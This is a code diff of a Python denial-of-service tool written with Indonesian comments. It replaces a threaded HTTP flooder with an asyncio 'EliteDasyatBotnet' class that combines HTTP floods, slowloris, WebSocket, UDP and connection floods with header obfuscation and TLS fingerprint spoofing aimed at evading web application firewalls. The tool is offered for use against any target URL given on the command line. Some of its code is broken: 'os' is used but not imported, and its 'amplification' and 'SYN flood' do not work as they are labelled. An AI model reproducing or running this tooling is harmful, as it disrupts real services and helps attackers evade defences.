@@ -1,246 +1,232 @@
-import socket
-import threading
-import string
+import asyncio
+import aiohttp
 import random
-import time
-import os
-import platform
-import sys
-import select
-import ssl
+import uuid
 import logging
-from concurrent.futures import ThreadPoolExecutor
-from colorama import Fore
+import base64
+import hashlib
+import socket
+import dns.resolver
+import ssl
+import time
+import websocket
+from fake_useragent import UserAgent
+from typing import Dict, List
 
-# Setup logging
-logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
-logger = logging.getLogger(__name__)
+# Logging Setup
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s - %(levelname)s - %(message)s",
+    handlers=[logging.StreamHandler(), logging.FileHandler("elite_dasyat_botnet.log")]
+)
 
-stop_attack = threading.Event()
-attack_stats = {"sent": 0, "errors": 0}
-
-# Clear screen
-def clear_text():
-    os.system('cls' if platform.system().upper() == "WINDOWS" else 'clear')
-
-# Generate random URL path
-def generate_url_path_pyflooder(num):
-    msg = str(string.ascii_letters + string.digits + string.punctuation)
-    return "".join(random.sample(msg, int(num)))
-
-def generate_url_path_choice(num):
-    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
-    return ''.join(random.choice(letter) for _ in range(int(num)))
-
-# Generate random headers
-def generate_random_headers():
-    user_agents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
-    ]
-    return {
-        "User-Agent": random.choice(user_agents),
-        "Referer": f"http://{''.join(random.choices(string.ascii_lowercase, k=10))}.com",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "Connection": "keep-alive",
-    }
-
-# Generate random POST body
-def generate_post_body(size=1000):
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))
-
-# Attack logic
-def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet, protocol):
-    global attack_stats
-    if stop_attack.is_set():
-        return
-    url_path = generate_url_path_pyflooder(10) if random.choice(['PY_FLOOD', 'CHOICES_FLOOD']) == "PY_FLOOD" else generate_url_path_choice(10)
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        # Wrap socket with SSL for HTTPS
-        if protocol == "https":
-            try:
-                context = ssl.create_default_context()
-                s = context.wrap_socket(s, server_hostname=host)
-                port = port if port != 80 else 443  # Default to 443 for HTTPS
-            except ssl.SSLError as e:
-                logger.error(f"SSL Error: {e}")
-                attack_stats["errors"] += 1
-                return
-
-        headers = generate_random_headers()
-        payload_patterns = {
-            'PY': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n" + \
-                  ''.join(f"{k}: {v}\r\n" for k, v in headers.items()) + "\r\n",
-            'HEAVY': f"{type_attack} /{url_path}?{'&'.join(f'q{i}={generate_post_body(200)}' for i in range(50))} HTTP/1.1\r\nHost: {host}\r\n" + \
-                     ''.join(f"{k}: {v}\r\n" for k, v in headers.items()) + "\r\n",
-            'POST': f"POST /{url_path} HTTP/1.1\r\nHost: {host}\r\n" + \
-                    ''.join(f"{k}: {v}\r\n" for k, v in headers.items()) + \
-                    f"Content-Length: {len(generate_post_body(2000))}\r\n\r\n{generate_post_body(2000)}",
-            'SLOW': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n" + \
-                    ''.join(f"{k}: {v}\r\n" for k, v in headers.items()) + "\r\n",
-            'OWN1': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n",
+class EliteDasyatBotnet:
+    def __init__(self, target: str, duration: int, max_connections: int = 1000):
+        self.target = target.rstrip('/')
+        self.duration = duration
+        self.max_connections = max_connections
+        self.ua = UserAgent()
+        self.headers = {
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive",
+            "Cache-Control": "no-cache",
+            "X-Forwarded-For": self._random_ip(),
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-Site": "none",
+            "Sec-WebSocket-Version": "13",
         }
-        packet_data = payload_patterns.get(data_type_loader_packet, payload_patterns['PY']).encode()
-        logger.debug(f"Connecting to {ip}:{port} with protocol {protocol}")
-        s.connect((ip, port))
-        s.settimeout(2)
+        self.paths = [
+            "/api/v{}/{}", "/{}.php", "/{}.json", "/graphql?query={}",
+            "/.env", "/config/{}", "/metrics/{}", "/adversarial/{}", "/ws/{}"
+        ]
+        self.dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]
+        self.success_count = {"http": 0, "slowloris": 0, "websocket": 0, "dns": 0, "udp": 0, "tcp_syn": 0}
+        self.response_times = {"http": [], "slowloris": [], "websocket": []}
+        self.active_connections = 0
 
-        # For SLOW payload, send data slowly
-        if data_type_loader_packet == 'SLOW':
-            s.send(f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n".encode())
-            for k, v in headers.items():
-                s.send(f"{k}: {v}\r\n".encode())
-                time.sleep(0.1)
-            s.send(b"\r\n")
-            while not stop_attack.is_set():
-                s.send(b"X-a: b\r\nX-b: c\r\n")
-                attack_stats["sent"] += 1
-                time.sleep(0.5)
-        else:
-            # Send multiple requests per connection with keep-alive
-            for _ in range(booter_sent):
-                if stop_attack.is_set():
-                    break
-                s.sendall(packet_data)
-                attack_stats["sent"] += 1
-                time.sleep(0.01)
+    def _random_ip(self) -> str:
+        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
 
-    except Exception as e:
-        attack_stats["errors"] += 1
-        logger.error(f"Error in attack to {ip}:{port}: {e}")
-    finally:
-        s.close()
+    def _generate_polymorphic_payload(self, size: int = 128) -> bytes:
+        """Polymorphic payload ringan pake hash dan UUID."""
+        base = str(uuid.uuid4()).encode() + str(time.time()).encode()
+        return base64.b64encode(hashlib.sha256(base + os.urandom(8)).digest())[:size]
 
-def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet, protocol, max_threads):
-    max_threads = min(max_threads, 30)  # Limit to avoid crash
-    with ThreadPoolExecutor(max_workers=max_threads) as executor:
-        while time.time() < time_loader and not stop_attack.is_set():
-            futures = [
-                executor.submit(DoS_Attack, ip, host, port_loader, methods_loader, booter_sent, data_type_loader_packet, protocol)
-                for _ in range(min(spam_loader, max_threads))
-            ]
-            for future in futures:
-                future.result()
+    def _generate_proof(self, data: bytes) -> str:
+        """Simple hash-based proof untuk verifikasi serangan."""
+        return hashlib.sha256(data + str(time.time()).encode()).hexdigest()[:16]
 
-# Validate input
-def validate_input(args_get):
-    if len(args_get) != 11:
-        return False, "Format: !FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> <SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> <HTTP_METHODS> <SPAM_CREATE> <MAX_THREADS> <PROTOCOL>"
-    try:
-        port = int(args_get[3])
-        time = int(args_get[4])
-        spam_thread = int(args_get[5])
-        create_thread = int(args_get[6])
-        booter_sent = int(args_get[7])
-        spam_create = int(args_get[9])
-        max_threads = int(args_get[10])
-        protocol = args_get[11].lower()
-        if not (1 <= port <= 65535):
-            return False, "Port harus antara 1-65535"
-        if time <= 0:
-            return False, "Waktu harus positif"
-        if any(x <= 0 for x in [spam_thread, create_thread, booter_sent, spam_create, max_threads]):
-            return False, "Semua parameter thread/paket harus positif"
-        if protocol not in ["http", "https"]:
-            return False, "Protokol harus 'http' atau 'https'"
-        if args_get[1].upper() not in ['PY', 'HEAVY', 'POST', 'SLOW', 'OWN1']:
-            return False, "TYPE_PACKET harus PY, HEAVY, POST, SLOW, atau OWN1"
-        return True, ""
-    except ValueError:
-        return False, "Parameter numerik harus berupa angka"
+    def _obfuscate_headers(self) -> Dict:
+        """Obfuscate headers untuk bypass WAF dan JA4 fingerprint."""
+        headers = self.headers.copy()
+        headers["User-Agent"] = self.ua.random
+        headers["X-Forwarded-For"] = self._random_ip()
+        headers["X-Adversarial-Tag"] = f"adv-{uuid.uuid4().hex[:8]}"
+        if random.random() < 0.5:
+            headers["Sec-Fetch-Mode"] = random.choice(["navigate", "same-origin", "no-cors"])
+            headers["Priority"] = f"u={random.randint(0, 4)}, i"
+        if random.random() < 0.4:
+            headers["X-Random-Noise"] = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz!@#$%^&*') for _ in range(random.randint(5, 20)))
+        if random.random() < 0.3:
+            headers["Sec-WebSocket-Key"] = base64.b64encode(os.urandom(16)).decode()
+            headers["Sec-WebSocket-Protocol"] = f"apex-{uuid.uuid4().hex[:8]}"
+        return headers
 
-# Countdown + interrupt
-def countdown_timer(time_loader):
-    global attack_stats
-    remaining = int(time_loader - time.time())
-    while remaining > 0 and not stop_attack.is_set():
-        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds | Sent: {attack_stats['sent']} | Errors: {attack_stats['errors']}{Fore.RESET}")
-        sys.stdout.flush()
-        if sys.stdin in select.select([sys.stdin], [], [], 1)[0]:
-            _ = sys.stdin.readline()
-            stop_attack.set()
-            print(f"\n{Fore.RED}Serangan Dihentikan{Fore.RESET}")
-            print(f"{Fore.CYAN}Statistik: {attack_stats['sent']} permintaan terkirim, {attack_stats['errors']} error{Fore.RESET}")
-            return
-        time.sleep(1)
-        remaining = int(time_loader - time.time())
-    if not stop_attack.is_set():
-        print(f"\n{Fore.GREEN}Serangan Selesai{Fore.RESET}")
-        print(f"{Fore.CYAN}Statistik: {attack_stats['sent']} permintaan terkirim, {attack_stats['errors']} error{Fore.RESET}")
-        stop_attack.set()
+    def _spoof_tls_fingerprint(self) -> ssl.SSLContext:
+        """TLS fingerprint spoofing untuk JA4 obfuscation."""
+        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+        ciphers = random.sample([
+            "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256",
+            "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-GCM-SHA256",
+            "TLS_AES_128_GCM_SHA256", "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256"
+        ], k=random.randint(3, 6))
+        context.set_ciphers(":".join(ciphers))
+        return context
 
-# Exit confirm
-def confirm_exit():
-    while True:
-        choice = input(f"{Fore.YELLOW}Mau keluar? (y/n): {Fore.RESET}").lower()
-        if choice == 'y':
-            print(f"{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
-            sys.exit(0)
-        elif choice == 'n':
-            print()
-            return
-
-# MAIN COMMAND LOOP
-def command():
-    global stop_attack, attack_stats
-    while True:
-        try:
-            data_input_loader = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ").strip()
-            if not data_input_loader:
-                confirm_exit()
-                continue
-            args_get = data_input_loader.lstrip('!').split(" ")
-            if args_get[0].lower() == "clear":
-                clear_text()
-            elif args_get[0].upper() == "FLOOD":
-                valid, error_msg = validate_input(args_get)
-                if not valid:
-                    print(f"{Fore.RED}{error_msg}{Fore.RESET}")
-                    continue
-                data_type_loader_packet = args_get[1].upper()
-                target_loader = args_get[2]
-                port_loader = int(args_get[3])
-                time_loader = time.time() + int(args_get[4])
-                spam_loader = int(args_get[5])
-                create_thread = min(int(args_get[6]), 30)
-                booter_sent = int(args_get[7])
-                methods_loader = args_get[8]
-                spam_create_thread = min(int(args_get[9]), 30)
-                max_threads = min(int(args_get[10]), 30)
-                protocol = args_get[11].lower()
-                host = ''
-                ip = ''
+    async def http_flood(self):
+        """L7: HTTP flood canggih dengan polymorphic payload dan WAF bypass."""
+        async with aiohttp.ClientSession() as session:
+            end_time = asyncio.get_event_loop().time() + self.duration
+            while asyncio.get_event_loop().time() < end_time:
+                start_time = asyncio.get_event_loop().time()
                 try:
-                    host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0]
-                    if any(x in host for x in ['.gov', '.mil', '.edu', '.ac']):
-                        print(f"{Fore.GREEN}Uhh You Can't Attack This Website {Fore.WHITE}[ {Fore.YELLOW}.gov .mil .edu .ac {Fore.WHITE}] . . .{Fore.RESET}")
-                        continue
-                    ip = socket.gethostbyname(host)
-                    logger.debug(f"Resolved {host} to {ip}")
-                except socket.gaierror as e:
-                    print(f"{Fore.YELLOW}FAILED TO GET URL: {e}{Fore.RESET}")
-                    continue
-                stop_attack.clear()
-                attack_stats = {"sent": 0, "errors": 0}
-                print(f"{Fore.LIGHTCYAN_EX}Serangan Dimulai\n{Fore.YELLOW}Target: {target_loader}\nIP: {ip}\nPort: {port_loader}\nType: {data_type_loader_packet}\nProtocol: {protocol.upper()}{Fore.RESET}")
-                for _ in range(create_thread):
-                    for _ in range(spam_create_thread):
-                        threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet, protocol, max_threads)).start()
-                countdown_timer(time_loader)
-                continue
-            else:
-                print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{args_get[0]} {Fore.LIGHTRED_EX}Not found command{Fore.RESET}")
-        except KeyboardInterrupt:
-            print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
-            stop_attack.set()
-            sys.exit(0)
+                    headers = self._obfuscate_headers()
+                    path = random.choice(self.paths).format(random.randint(1, 5), random.randint(1, 10000))
+                    payload = self._generate_polymorphic_payload()
+                    proof = self._generate_proof(payload)
+                    async with session.post(
+                        f"{self.target}{path}",
+                        headers=headers,
+                        data=payload,
+                        ssl=self._spoof_tls_fingerprint() if random.random() < 0.4 else False,
+                        timeout=0.15
+                    ) as resp:
+                        self.success_count["http"] += 1 if resp.status < 400 else 0
+                        self.response_times["http"].append((asyncio.get_event_loop().time() - start_time) * 1000)
+                        logging.info(f"L7 HTTP flood to {self.target}{path}, status={resp.status}, proof={proof}")
+                except Exception as e:
+                    logging.error(f"L7 HTTP flood failed: {str(e)}")
+                await asyncio.sleep(random.uniform(0.002, 0.01))  # Timing jitter
+
+    async def slowloris(self):
+        """L7: Slowloris untuk exhaust resource server."""
+        async with aiohttp.ClientSession() as session:
+            end_time = asyncio.get_event_loop().time() + self.duration
+            while asyncio.get_event_loop().time() < end_time:
+                start_time = asyncio.get_event_loop().time()
+                try:
+                    headers = self._obfuscate_headers()
+                    headers["Connection"] = "keep-alive"
+                    async with session.get(
+                        f"{self.target}/",
+                        headers=headers,
+                        ssl=self._spoof_tls_fingerprint() if random.random() < 0.4 else False,
+                        timeout=5
+                    ) as resp:
+                        self.success_count["slowloris"] += 1 if resp.status < 400 else 0
+                        self.response_times["slowloris"].append((asyncio.get_event_loop().time() - start_time) * 1000)
+                        logging.info(f"L7 Slowloris to {self.target}, status={resp.status}")
+                        await asyncio.sleep(random.uniform(1, 3))  # Keep connection open
+                except Exception as e:
+                    logging.error(f"L7 Slowloris failed: {str(e)}")
+                await asyncio.sleep(random.uniform(0.01, 0.05))
+
+    async def websocket_flood(self):
+        """L7: WebSocketflood untuk exhaust koneksi."""
+        end_time = asyncio.get_event_loop().time() + self.duration
+        while asyncio.get_event_loop().time() < end_time:
+            try:
+                headers = self._obfuscate_headers()
+                ws_url = self.target.replace("http", "ws") + random.choice(self.paths).format(random.randint(1, 5), random.randint(1, 10000))
+                ws = websocket.WebSocket()
+                ws.connect(ws_url, header=headers)
+                payload = self._generate_polymorphic_payload(64)
+                proof = self._generate_proof(payload)
+                ws.send(payload)
+                self.success_count["websocket"] += 1
+                logging.info(f"L7 WebSocket flood to {ws_url}, proof={proof}")
+                await asyncio.sleep(random.uniform(0.5, 2))  # Keep WebSocket open
+                ws.close()
+            except Exception as e:
+                logging.error(f"L7 WebSocket flood failed: {str(e)}")
+            await asyncio.sleep(random.uniform(0.01, 0.05))
+
+    async def dns_amplification(self):
+        """L3/L4: DNS amplification ringan."""
+        resolver = dns.resolver.Resolver()
+        resolver.nameservers = self.dns_servers
+        end_time = asyncio.get_event_loop().time() + self.duration
+        while asyncio.get_event_loop().time() < end_time:
+            try:
+                domain = f"{uuid.uuid4().hex}.example.com"
+                answer = await asyncio.get_event_loop().run_in_executor(
+                    None, lambda: resolver.resolve(domain, 'TXT')
+                )
+                self.success_count["dns"] += 1
+                logging.info(f"L3/L4 DNS amplification to {domain}, response={len(answer.response)} bytes")
+            except Exception as e:
+                logging.error(f"L3/L4 DNS amplification failed: {str(e)}")
+            await asyncio.sleep(random.uniform(0.005, 0.02))
+
+    async def udp_flood(self, port: int = 80):
+        """L4: UDP flood untuk simulasi QUIC-like."""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        end_time = asyncio.get_event_loop().time() + self.duration
+        while asyncio.get_event_loop().time() < end_time:
+            try:
+                payload = self._generate_polymorphic_payload(64)
+                proof = self._generate_proof(payload)
+                sock.sendto(payload, (self.target.replace('http://', '').replace('https://', ''), port))
+                self.success_count["udp"] += 1
+                logging.info(f"L4 UDP flood to {self.target}:{port}, payload_size={len(payload)}, proof={proof}")
+            except Exception as e:
+                logging.error(f"L4 UDP flood failed: {str(e)}")
+            await asyncio.sleep(random.uniform(0.001, 0.005))
+        sock.close()
+
+    async def tcp_syn_flood(self, port: int = 80):
+        """L4: TCP SYN flood untuk exhaust koneksi."""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.setblocking(False)
+        end_time = asyncio.get_event_loop().time() + self.duration
+        while asyncio.get_event_loop().time() < end_time:
+            try:
+                await asyncio.get_event_loop().sock_connect(sock, (self.target.replace('http://', '').replace('https://', ''), port))
+                self.success_count["tcp_syn"] += 1
+                logging.info(f"L4 TCP SYN flood to {self.target}:{port}")
+            except Exception as e:
+                logging.error(f"L4 TCP SYN flood failed: {str(e)}")
+            await asyncio.sleep(random.uniform(0.001, 0.005))
+        sock.close()
+
+    async def run(self):
+        """Jalankan serangan multi-layer."""
+        self.active_connections = self.max_connections
+        tasks = []
+        # Distribusi tugas: 40% HTTP flood, 20% slowloris, 15% WebSocket, 15% DNS, 10% UDP, 10% TCP SYN
+        tasks.extend([self.http_flood() for _ in range(int(self.max_connections * 0.4))])
+        tasks.extend([self.slowloris() for _ in range(int(self.max_connections * 0.2))])
+        tasks.extend([self.websocket_flood() for _ in range(int(self.max_connections * 0.15))])
+        tasks.extend([self.dns_amplification() for _ in range(int(self.max_connections * 0.15))])
+        tasks.extend([self.udp_flood() for _ in range(int(self.max_connections * 0.1))])
+        tasks.extend([self.tcp_syn_flood() for _ in range(int(self.max_connections * 0.1))])
+        logging.info(f"Starting elite dasyat botnet on {self.target} with {len(tasks)} tasks")
+        await asyncio.gather(*tasks)
+        avg_response = {k: (sum(v)/len(v) if v else 0) for k, v in self.response_times.items()}
+        logging.info(f"Attack completed. Success counts: {self.success_count}, Avg response times (ms): {avg_response}")
+
+async def main(target: str, duration: int):
+    botnet = EliteDasyatBotnet(target, duration)
+    await botnet.run()
 
 if __name__ == "__main__":
-    try:
-        command()
-    except KeyboardInterrupt:
-        print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
-        stop_attack.set()
-        sys.exit(0)
+    import sys
+    if len(sys.argv) != 3:
+        print("Usage: python elite_dasyat_botnet.py <target_url> <duration_seconds>")
+        sys.exit(1)
+    target_url = sys.argv[1]
+    duration = int(sys.argv[2])
+    asyncio.run(main(target_url, duration))
